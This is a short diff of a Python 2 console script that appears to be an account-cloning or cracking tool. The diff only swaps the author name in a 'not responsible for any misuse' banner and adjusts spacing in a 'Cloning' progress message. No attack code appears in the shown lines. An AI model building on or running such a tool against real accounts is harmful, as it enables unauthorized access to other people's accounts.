@@ -82,7 +82,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;97m************************************************
-\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR AAHIL ~
+\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR SHADOW ~
 \033[1;97m************************************************
 
 \033[1;93m____─▄───────▄█▄───────▄─ Stay Home 💓
@@ -297,7 +297,7 @@ def pilih_super():
 	jalan('\033[1;34;40m[✺] Please Wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;32;40m[✺]Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
